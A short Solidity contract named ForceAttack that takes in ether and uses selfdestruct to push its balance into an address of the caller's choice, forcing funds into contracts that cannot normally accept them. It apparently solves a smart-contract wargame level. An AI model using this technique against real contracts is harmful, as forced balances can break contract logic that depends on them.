pragma solidity ^0.8.0;

contract ForceAttack {
    receive() external payable {

    }

    function destroy(address payable _address) public {
        selfdestruct(_address);
    }
}